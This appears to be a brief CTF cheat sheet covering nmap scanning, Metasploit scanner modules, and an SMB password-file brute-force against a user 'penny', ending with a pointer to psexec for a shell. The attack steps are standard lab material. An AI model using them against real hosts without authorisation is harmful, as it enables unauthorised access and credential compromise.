# 🔍 CTF Scanning & SMB Exploitation

## 1. Start Metasploit
```bash
msfconsole
```

## 2. Basic Nmap Scan
```bash
nmap [target-ip]
```

### Useful Nmap Options:
- `-p`: Scan specific ports (e.g. `-p 80,443`)
- `-sV`: Version detection
- `-sU`: UDP scan

## 3. Metasploit Scanning Modules
To use a scanner module:
1. Search scanner:
   ```bash
   search type:auxiliary scanner
   ```
2. Select scanner:
   ```bash
   use [module_number]
   ```
3. Configure it:
   ```bash
   set RHOSTS [target-ip]
   set THREADS 10
   run
   ```

### Example: Port 8000
```bash
nmap -sV -p 8000 [target-ip]
```

## 4. SMB Enumeration & Password File Attack

### Step-by-step:
```bash
search smb_login
use [module_number]
set RHOSTS [target-ip]
set SMBUser penny
set PASS_FILE /path/to/passwords.txt
run
```

Once a valid password is found, a shell can be attempted using `exploit/windows/smb/psexec` or other appropriate modules.